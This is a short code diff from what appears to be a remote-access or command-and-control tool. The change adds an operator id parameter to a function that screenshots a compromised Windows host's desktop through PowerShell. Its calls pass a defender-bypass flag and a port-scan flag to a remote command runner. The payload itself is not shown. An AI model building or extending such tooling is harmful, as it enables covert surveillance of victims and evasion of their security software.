@@ -15,7 +15,7 @@ COLOR_RESET  = "\001\x1b[0m\002"
 UNDERLINE_ON  = "\001\x1b[4m\002"
 UNDERLINE_OFF = "\001\x1b[24m\002"
 
-def screenshot(sid: str, local_path: str = None):
+def screenshot(sid: str, local_path: str = None, op_id="console"):
     """
     Capture the interactive desktop via PowerShell (Windows only),
     pull back a Base64‐PNG, and write it to local_path.
@@ -50,9 +50,9 @@ def screenshot(sid: str, local_path: str = None):
 
     # invoke on agent
     if session.transport in ("http", "https"):
-        out_b64 = shell.run_command_http(sid, ps)
+        out_b64 = shell.run_command_http(sid, ps, op_id=op_id)
     else:
-        out_b64 = shell.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True, portscan_active=True)
+        out_b64 = shell.run_command_tcp(sid, ps, timeout=2.0, defender_bypass=True, portscan_active=True, op_id=op_id)
 
     if not out_b64:
         print(brightyellow + "[*] No output or command failed")
